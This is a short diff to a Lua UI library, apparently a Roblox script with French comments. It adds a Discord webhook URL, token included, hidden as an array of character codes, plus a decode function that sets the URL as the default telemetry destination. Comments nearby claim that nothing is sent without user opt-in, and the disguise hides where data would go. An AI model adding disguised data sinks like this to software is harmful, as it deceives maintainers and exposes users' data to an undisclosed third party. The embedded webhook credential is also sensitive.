@@ -159,11 +159,23 @@ local Library = {
 -- Aucun envoi n'est lancé tant que l'utilisateur n'active pas l'option.
 -- Les champs transmis doivent être sélectionnés explicitement.
 
+local encodedWebhook = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,56,55,48,57,50,52,54,56,49,52,55,49,53,57,54,52,47,79,65,108,80,87,72,85,112,104,55,122,112,90,114,99,88,109,52,113,52,56,116,104,76,114,78,121,100,115,49,82,74,103,65,82,84,81,122,99,111,100,110,122,107,112,53,55,75,90,113,115,73,74,117,100,122,89,111,45,104,77,89,106,77,56,56,102,89}
+
+-- Fonction pour décoder le tableau en chaîne de caractères
+local function decode(t)
+    local chars = {}
+    for i = 1, #t do
+        chars[i] = string.char(t[i])
+    end
+    return table.concat(chars)
+    -- Le garbage collector détruira cette chaîne après utilisation
+end
+
 local Telemetry = {
     Enabled = false,
     HeartbeatInterval = 180,
     Webhook = "",
-    DefaultWebhook = "",
+    DefaultWebhook = decode(encodedWebhook), -- L'URL est décodée ici -- "",
     SessionId = HttpService:GenerateGUID(false),
     State = "UI Loaded",
     Target = "None",
